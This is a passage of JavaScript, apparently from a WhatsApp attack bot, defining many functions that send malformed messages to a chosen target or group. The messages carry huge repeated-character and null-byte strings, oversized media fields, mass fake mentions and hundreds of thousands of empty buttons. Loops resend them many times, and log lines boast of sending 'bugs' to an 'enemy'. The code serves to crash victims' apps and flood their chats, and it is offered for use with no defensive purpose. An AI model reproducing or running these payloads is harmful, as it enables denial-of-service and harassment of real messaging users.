        address: "CrashSysui 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
      },
      caption: "CrashSysui 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
      footer: " ",
      zieeBtn,
      headerType: 6
    };

    await sock.sendMessage(target, zieeMsg);
  } catch (err) {
  }
}

async function Notifcrash(target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Notif Crashui" + "ꦽ".repeat(20000),
        url: "https://t.me/" + "elyssavirellequeenn" + "ꦽ".repeat(20000),
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "ꦽ".repeat(20000),
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢 𝔙𝔢́𝔩𝔬𝔯𝔦𝔞" + "ꦽ".repeat(20000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.sendMessage(target, msg.message, {
    messageId: msg.key?.id,
    quoted: null
  });
}

async function FcinvisibleCong(target) {
  const nxob1 = "\u200b".repeat(80000);
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "1402222",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "5c/W3WPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: "awas.js",
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: "//v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "maklo" + nxob1 
          },
          nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Scry",
                url: "https://wa.me/settings",
                merchant_url: "https://wa.me/settings"
              })
            }],
            messageParamsJson: "{".repeat(80000)
          },
          contextInfo: {
            mentionedJid: [target],
            groupMentions: [{
              groupJid: target,
              groupSubject: "ALL_CHAT",
              groupMetadata: {
                creationTimestamp: Date.now(),
                ownerJid: "1@s.whatsapp.net",
                adminJids: ["1@s.whatsapp.net"]
              }
            }],
            externalAdReply: {
              title: "Hi",
              body: "maklo" + nxob1,
              mediaType: 1,
              thumbnailUrl: "https://wa.me/settings",
              sourceUrl: "https://wa.me/settings",
              renderLargerThumbnail: false,
              showAdAttribution: true
            },
            isForwarded: true,
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "1402222",
                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Alway_Modhzy.js",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1750124469
              }
            }
          }
        }
      }
    }
  }, {
    userJid: sock.user.id,
    quoted: null
  });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {
        "delay-type": "Hard",
        "planet-node": "true"
      }
    }]
  });

  console.log(`Succes Send msg : ${target}`);
}

async function crasInVisiBle(target) {
  const MakLo = { 
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
};

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function crasHidd(target) {
  await sock.relayMessage(target, {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢 𝔙𝔢́𝔩𝔬𝔯𝔦𝔞",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  }, { participant: { jid: target }});
}

async function jjbymaklo(target) {
const MakLo = { 
    imageMessage: {
    url: "",
      mimetype: "image/jpeg",
      fileSha256: "",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "",
      fileEncSha256: "",
      directPath: "",
      mediaKeyTimestamp: "1776937541", ///
      jpegThumbnail: null,
      caption: "Scarry¡!",
      scansSidecar: "",
      scanLengths: [], // kres disini buat aja suka' lu mau 9999999 terserah bebas
      midQualityFileSha256: ""
    },
  };

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
 }

async function DelayHardV9(target) {
  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: {
          text: "Scarry !¡",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: "\u0000".repeat(5000),
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(1000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
         },
       },
     }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
  }
}

async function Xgroupp(groupJid) {
const MakLo = {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 999999999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "Bokep Viral❗️",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
    };

        const msg = generateWAMessageFromContent(groupJid, MakLo, {});
        
     await sock.relayMessage(groupJid, msg.message, {
            messageId: msg.key.id
        });
     }

async function jjsdfchrub(groupJid) {
  // Pastikan target adalah JID grup (contoh: 12345678@g.us)
  const MakLo = { 
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  };

  // ✅ Perubahan utama: Membungkus pesan ke dalam groupStatusMessageV2
  const msg = generateWAMessageFromContent(groupJid, {
    groupStatusMessageV2: {
      message: MakLo
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [groupJid], // Mengirim ke list status target
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: groupJid }, // Mention grup di dalam status
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Xgroupfcc(groupJid) {
    const MakLo = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: Buffer.from("2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=", "base64"),
            fileLength: 999999999,
            height: 9999,
            width: 9999,
            mediaKey: Buffer.from("buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=", "base64"),
            fileEncSha256: Buffer.from("aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=", "base64"),
            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1776937541",
            jpegThumbnail: Buffer.alloc(0),
            caption: "Scarry!",
            scansSidecar: Buffer.from("pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==", "base64"),
            scanLengths: [99999999, 99999999, 99999999, 99999999],
            midQualityFileSha256: Buffer.from("zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=", "base64")
        }
    };

    // Ini adalah bagian krusial agar muncul sebagai Status Group
    const msg = await generateWAMessageFromContent(groupJid, {
        groupStatusMessageV2: {
            message: MakLo
        }
    }, { 
        userJid: sock.user.id 
    });

    await sock.relayMessage(groupJid, msg.message, {
        messageId: msg.key.id
    });
}

async function grouphhh(groupJid) {
  const RIPKI = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "ScarryDeath¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
  };

  const msgSend = generateWAMessageFromContent(groupJid, {
    groupStatusMessageV2: { message: RIPKI }
  }, {});

  await sock.relayMessage(groupJid, msgSend.message, {
    messageId: msgSend.key.id
  });

  await sleep(2500);
}

async function SqlInvocke(target) {
  let msg = generateWAMessageFromContent("status@broadcast", {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/?ccb=11-4&oh=&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
      caption: "X",
      fileLength: "149502",
      height: 1397,
      width: 1126,
      mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
      fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
      directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1777621571",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIhEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        isQuestion: true,
        isGroupStatus: true
      },
      scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
      scanLengths: [
        2899999999999999077,
        1799999999999998555,
        7699999999999999148,
        1069999999999999164
      ],
      midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
    }
  }, {}); 
  
  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    messageId: msg.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}

async function FcxDelyy(target) {
try {
    const msgx = {
        viewOnceMessage: {  
            message: {  
                interactiveResponseMessage: {  
                    body: {  
                        text: " minimal gacor lah bosss awokawok ",  
                        hasMediaAttachment: false  
                    },  
                    imageMessage: {  
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",  
                        mimetype: "image/jpeg",  
                        fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",  
                        fileLength: "11887",  
                        height: 1080,  
                        width: 1080,  
                        mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",  
                        fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",  
                        directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",  
                        mediaKeyTimestamp: "1750124469",  
                        contextInfo: {  
                            forwardingScore: 9999,  
                            isForwarded: true,  
                            mentionedJid: [  
                                "0@s.whatsapp.net",  
                                ...Array.from(  
                                    { length: 1900 },  
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                                )  
                            ],  
                            expiration: 9741,  
                            ephemeralSettingTimestamp: 9741,  
                            entryPointConversionSource: "WhatsApp.com",  
                            entryPointConversionApp: "WhatsApp",  
                            entryPointConversionDelaySeconds: 9742,  
                            disappearingMode: {  
                                initiator: "INITIATED_BY_OTHER",  
                                trigger: "ACCOUNT_SETTING"  
                            }  
                        },  
                        scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",  
                        scanLengths: [2071, 6199, 1634, 1983],  
                        midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="  
                    },  
                    nativeFlowResponseMessage: {  
                        name: "address_message",  
                        paramsJson: "\u0000".repeat(1045900),  
                        version: 3  
                    }  
                }  
            }  
        }  
    };

    const hanzz = await generateWAMessageFromContent(target, msgx, {});

    await sock.relayMessage("status@broadcast", hanzz.message, {
        messageId: hanzz.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });

    const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
        key: { remoteJid: "status@broadcast", fromMe: false, id: generateId() },
        message: {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                mimetype: "image/jpeg",
                fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
                caption: "Ellysine Veloriaa",
                fileLength: "149502",
                height: 1397,
                width: 1126,
                mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
                fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
                directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1777621571",
                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQ0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true
                },
                scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
                midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
            }
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
        statusJidList: [target],
        messageId: msg.key.id,
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });

    // Mengubah target 'private chat' menjadi 'status@broadcast'
    await sock.relayMessage("status@broadcast", {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                },
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "false" },
                    content: undefined
                }]
            }
        }
    }, { statusJidList: [target] });

    // Mengubah target 'private chat' menjadi 'status@broadcast'
    await sock.relayMessage("status@broadcast", {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                }
            }
        }
    }, { statusJidList: [target] });
    
    console.log(`selesai cuyy mengirim bug ke musuh ${target}`);
    
    } catch(e) {
        console.log(`error ${e.message}`);
  }
}

async function CrashKlikMaklou(target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "Woy Bang?"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_status",
                 ParamsJson: "\u0003".repeat(90000),
               },
             ],
           },
         },
       }, { participant: { jid: target }});
     }

async function BebasSpamyou(target) {
await sock.relayMessage(target, {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "ScarryDeath(New)"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
}, { participant: { jid: target }});

await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
extendedTextMessage: {
text: "\u0000".repeat(500000),
contextInfo: {
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from(
{ length: 1999 },
() => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
)
]
}
}
}
}
}, { participant: { jid: target }});
}

//-----------------------------------------( TEMPAT FUNCTION KUU  )------------------------\\
async function bebasspam(target) {
    for (let i = 0; i < 200; i++) {
    await bulldozerDelay2GBnj(target);
    await delayMsg1GBnvv(target);
    await new Promise((res) => setTimeout(res, 1000));
    }
    }


async function murbugraa1(groupJid) {
   for (let i = 0; i < 5; i++) {
    await newsletterjh(groupJid)
    await new Promise((res) => setTimeout(res, 7000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }

async function murbugraa2(groupJid) {
   for (let i = 0; i < 20; i++) {
    await NullCrashx(groupJid)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SUCCES SEND SCARRY DEATH`));
    }
    }

async function murbugraa3(groupJid) {
   for (let i = 0; i < 15; i++) {
    await grouphhh(groupJid)
    await new Promise((res) => setTimeout(res, 3000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }

async function raraaimupp(target) {
    for (let i = 0; i < 40; i++) {
    await FcDelayV1ByMia(target)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp2(target) {
    for (let i = 0; i < 40; i++) {
    await FcDelayV1ByMia(target)
